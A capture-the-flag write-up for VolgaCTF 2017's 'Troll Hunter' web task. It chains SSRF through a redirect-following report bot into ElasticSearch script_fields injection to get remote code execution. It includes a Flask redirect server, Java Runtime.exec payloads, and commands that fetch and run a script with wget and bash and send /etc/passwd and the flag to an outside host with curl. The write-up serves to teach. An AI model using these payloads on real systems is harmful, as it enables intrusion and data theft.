# VolgaCTF Quals 2017 -- Troll Hunter
**Category**: Web

**Description**:
> Trolls are everywhere. Fight with us! <br>
> troll-hunter.quals.2017.volgactf.ru:9494

# Writeup
> disclaimer: I was too slow and lazy to do some screenshots or snippets of the site-sources, so turn your imagination on and try to imagine the missing frontend.

## The Entry Point

Following provided link we could see a website that wanted to help the world to fight against internet trolles.

After a while, clicking on inputs and observing requests in Burp we find 2 entry points to the underlying API:
- quite strange way to get troll information using request to some kind of DB
- input form that follows submitted IP and do some kind of checks

## Find The Troll

All information about knonw trolls were retrieved using links like: 

`http://troll-hunter.quals.2017.volgactf.ru:9494/show?id=q=_id:1`

Visiting the link directly we could see HTML-card with troll info and some interesting snippet of code that was commented out:
```html
<!-- <article> <a href="http://mdomaradzki.deviantart.com/art/Bueller-III-351975087" class="image featured"><img src="images/pic01.jpg" alt=""></a> <header> <h3><a id="mylightbox" data-featherlight="#mylightbox" href="#">Pulvinar sagittis congue</a></h3> </header> <p>{"ip"=>"192.9.35.7", "name"=>"Anonymous", "img"=>"/images/troll5.png", "description"=>"Anonymous troll. Nobody knows his name"}</p> </article> -->
```

After some fuzzing we knew that:
- We could find a troll using any paramter (**ip**, **name**, **img**, **description** and hidden **_id**)
- Requests which could not find anything returns **"Problem with Connection"**
- We could use multiple paramters in query string, like 

  ```http://troll-hunter.quals.2017.volgactf.ru:9494/show?id=q=img:*troll*%20name:Anonymous```
- We could use wildcards like `/show?id=q=fo*` and keywords **sort** and **from**
- We could not retrieve anything useful from DB (except trolls that we've already seen)

Using that info we found out that the actual backend proxies our request to the ElasticSearch. 
`/show?id=` param is URI decoded and used as a query to [search uri](https://www.elastic.co/guide/en/elasticsearch/reference/current/search-uri-request.html)

So we got that have a full control over the query to the specific index of the ElasticSearch but couldn't do anything interesting enough.

*(Writing that text riht now I think that we could try to exploit the target vuln using that functionality, but I can't check it, so let's follow our path)*

## Report Them All!

The second entry point was the form which reports given IP of the troll to the site admins.

Obviously we want to check will the provided IP be visited or just stored, so feed the bot with our public IP and wait for vivstors:

```bash
yalegko@isc:~$ nc -lkvvv 4041
Listening on [0.0.0.0] (family 0, port 4041)
Connection from [185.143.173.223] port 4041 [tcp/*] accepted (family 2, sport 48358)
GET / HTTP/1.1
Accept-Encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3
Accept: */*
User-Agent: Ruby
Host: 92.63.71.187:4041
```

Aha! It's alive!

So after a bit of tries we got that:
- Bot ignores URI scheme, path and params and uses only provided host and port (all auth parts of URI are also ignored) to do `GET /` request
- If we answer `200 OK` bot says *"Ok. We'll check this. Thank you!"*, if we send some `4xx` or `5xx` error bot says *"Sorry, we can't check this ip. Something wrong"*
- **Bot follow redirects!** And morevover it uses provided location as is, so we have full control over request path and query string

## Knock-Knock, Elastic, R U There?

Sending bot to the `http://localhost:9200/_cat/indices?v` we make sure that we can acess elastic in that way, but we cant get any info except **"OK"** or **"Not OK"**.

*Oh, no! Is it error-based blind elasticsearch injection? D:*

At that moment we got much more access to the elastic REST API so we took a closer look to [its docs](https://www.elastic.co/guide/en/elasticsearch/reference/current/search-request-body.html) and found the following:
> The body content can also be passed as a REST parameter named source.

So we could send request body via query argument `source` like:
```
    Location http://localhost:9200/_search?source={"query": {"match_all": { } } }
```

Time to try quite interesting field `script_fields`:
```
    OK -- GET /_search?source={"size":1,"query":{"match_all":{}},"script_fields":{"lol":{"script":"1+1"}}}
    OK -- GET /_search?source={"size":1,"query":{"match_all":{}},"script_fields":{"lol":{"script":"(new Date()).getTime()"}}}
    FAIL -- GET /_search?source={"size":1,"query":{"match_all":{}},"script_fields":{"lol":{"script":"import java.net.*"}}}
    ... Thousands of fails skipped ...
    OK -- GET /_search?source={"size":1,"query":{"match_all":{}},"script_fields":{"lol":{"script":"l = (new Date()).getTime(); while((new Date()).getTime()-10000<l){}"}}}
```

That way we have some kind of java-like language (groovy?) and possible RCE, so we wrote simple webserver and did fuzzing a lot:
```python
from flask import Flask, request
from flask import Response
import requests
app = Flask(__name__)

url = ""
lock = False

@app.route("/check/<path:path>")
def check(path):
    global url, lock
    if lock:
        return "Already in process", 400
    try:
        lock = True
        url = 'http://127.0.0.1:9200/'+ path +'?' + request.query_string.decode()
        r = requests.post("http://troll-hunter.quals.2017.volgactf.ru:9494/checkip", data={"ip":"http://sibears.ru:4042"})
        lock = False
        return r.text, r.status_code
    except Exception as e:
        lock = False
        return str(e), 500

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=4042, threaded=True)
```

## Run My Damn Code

Using that flask webserver and the little helper:
```python 
search = lambda p: requests.get("http://sibears.ru:4042/check/_search", params={"source": json.dumps(p)}).text
exec_cmd = lambda cmd: search({"size":1,"query":{"match_all":{}},"script_fields":{"lol":{"script":cmd}}})
```

We tried tons of code until our teammate won't ask us had we tried to get java Runtime class as it's done in android hacks:
```java
window.jsinterface.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);
```

After a while we adapted that solution for elastic:
```java
java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("%s").getText()
```

And get RCE!
```python
search = lambda p: requests.get("http://sibears.ru:4042/check/_search", params={"source": json.dumps(p)}).text
   
def exec_sh(cmd):
    payload = {
        "size":1,
        "script_fields": {
            "lol": {
                "script": 
                    '''java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("%s").getText()''' % cmd
                    }
            }
    }
    search(payload)
```

## I Dare You, I Double Dare I'll Pwn You

Do you remember that we have blind shell? 

Surely we tried to run reverse-tcp and http shells but we've failed (probably it's possible but we were quite tired and angry) so all we could do - send results via curl:
```python
exec_sh('curl --upload-file /etc/passwd sibears.ru:4042')
```

The worst thing was that we can't run (mb just cos we hate java :o)
```java
java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec(new String[]{ "/bin/sh", "-c", "<cmd>" }).getText()
```

That way we have no pipes, command substitutions and so on. Thereby we decided to do it in hard way.

Improve our web server:
```python
from flask import Flask, request
from flask import Response
import requests
app = Flask(__name__)

url = ""
lock = False

@app.route("/print", methods=['GET', 'POST', 'PUT'])
def print_1():
    print("FILE!!!!!\n")
    print(request.stream.read().decode('base64'))
    print("FILE!!!!!\n")
    return "kek"

@app.route("/save/<path:path>", methods=['POST', 'PUT'])
def saas(path):
    with open(path, 'wb') as f:
        f.write(request.stream.read().decode('base64'))
    return "lol"

@app.route("/cmd")
def cmd1():
    with open('cmd.txt', 'r') as f:
        s = f.read()
    return s

@app.route("/")
def hello():
    resp = Response('privet, bot')
    resp.headers['Location'] = url
    return resp, 302

@app.route("/check/<path:path>")
def check(path):
    global url, lock
    if lock:
        return "Already in process", 400
    try:
        lock = True
        url = 'http://127.0.0.1:9200/'+ path +'?' + request.query_string.decode()
        r = requests.post("http://troll-hunter.quals.2017.volgactf.ru:9494/checkip", data={"ip":"http://92.63.71.187:5000"})
        lock = False
        return r.text, r.status_code
    except Exception as e:
        lock = False
        return str(e), 500

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=4042, threaded=True)
```

And now execute command as following:
```python
echo 'cmd' > cmd.txt
exec_sh("wget -O /tmp/asdqwe sibears.ru:4042/cmd"); exec_sh('bash /tmp/asdqwe')
```

After fucking hours of looking for flag in the Share Point the first thing we've done - run the find command:
```bash 
find / -name "*flag*" | base64 | curl -d @- sibears.ru:4042/print
```

Which gives us flag location "/flag":
```bash
cat /flag | base64 | curl -d @- sibears.ru:4042/print
```

Flag: `VolgaCTF{troll_is_dead_now_we_win_the_battle}`

## P.S.

Ofc our solution isn't optimal but it reflects our way to get the flag, so I believe that it can be useful.

If you are sure that you can do it faster, we steal [app sources](./task) just btw, so you can try to pwn it by yourself.


